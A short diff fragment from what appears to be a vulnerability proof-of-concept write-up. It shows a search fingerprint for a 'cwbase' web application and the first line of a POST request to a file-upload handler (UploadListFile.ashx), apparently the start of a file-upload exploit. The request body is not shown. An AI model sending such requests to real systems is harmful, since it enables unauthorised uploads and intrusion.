@@ -8,7 +8,7 @@
 body="/cwbase/web/scripts/jquery.js" || icon_hash="-1341069524"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
